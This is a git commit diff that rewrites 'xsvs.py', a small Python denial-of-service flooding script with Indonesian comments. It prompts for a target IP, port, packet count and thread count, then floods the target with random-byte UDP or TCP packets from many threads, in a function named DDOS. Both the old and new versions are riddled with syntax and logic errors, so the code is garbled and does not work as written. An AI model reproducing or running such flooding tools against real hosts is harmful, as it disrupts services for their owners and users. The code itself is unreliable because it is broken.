ee67884fc23a6a303cd4d8b2e3c7fb07d8e43185
MyRull <96748423+MyRull@users.noreply.github.com>
2022-01-18 01:38:04 +0700

    Update xsvs.py

--- xsvs.py
+++ xsvs.py
@@ -1,46 +1,43 @@
-#Age 17-01-2022 Time 12:32 
-#Semoga sakit tools nya ya banh
-#Hasil Gabut
-#Codes by Rull
+# TOOLS UNTUK TCP 
+# Xsvs Comunity
+
+import socket
 import random
-import socket 
 import threading
+import os
 
-ip = str(input(" IP:"))
-port = int(input(" PORT:"))
-times = int(input(" PACKETS:"))
-threads = int(input(" THREADS:"))
-def run():
-  data = random._unrandom(1025)
-  xx = int(0)
-  while True:
-    try:
-      s = socket.socket(socket.AF_INET       , socket.SOCK_DGRAM)
-      addr = (str(ip),int(port))
-       for x in range(times):
-           s.sendto(data,addr)
-           print(' Sedang Menyenggol '+ip+)
-           except:
-             print(' Berhasil Menyenggol '+ip+)
+def banner(): # Banner
+    os.system("cls || clear")
+    print(fr"""
+██████╗░██╗░░░██╗██╗░░░░░██╗░░░░░
+██╔══██╗██║░░░██║██║░░░░░██║░░░░░
+██████╔╝██║░░░██║██║░░░░░██║░░░░░
+██╔══██╗██║░░░██║██║░░░░░██║░░░░░
+██║░░██║╚██████╔╝███████╗███████╗
+╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝
+ """)
 
-def.run2():
-  data = random._unrandom(16)
-  i = random.choice(("[]","[!]","[#]"))
-  while.ture:
-    try:
-      s = socket.socket(socket.AF_INET        , socket.SOCK_STREAM)
-      s.connect((ip,port))
-      s.send((data))
-      print(' Sedang Menyenggol '+ip+)
-      except:
-        s.close()
-        print(' Berhasil menyenggol '+ip+)
-  
-  for x in range(threads):
-    if.choice == 'x':
-      th == threading.Threads(target run2)
-      th.start():
-        else:
-         th = threading.Threads(target run2)
-         th.start()
+ip = str(input('[+] IP: ' ))
+port = int(input('[+] PORT: '))
+packet = int(input('[+] PACKET: '))
+thread = int(input('[+] THREADS: '))
 
+def DDOS():
+	Xeamus = random._urandom(1020)
+	xx = int(0)
+	while True:
+		try:
+		     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		     s = connect((ip,port))
+		     s = send(Xeamus)
+		     for i in range(packet):
+			       s.send(Xeamus)
+			 xx += random.randint(0, int(packet))
+			 print('Sedang Menyenggol '+ip+ 'sent!!!' +str(xx))
+        except:
+       	   s.close()
+           print(' Berhasil Tersenggol ')
+
+ for x in range(thread):
+	 thred = threading.Thread(target=DDOS)
+	 thred.DDOS()
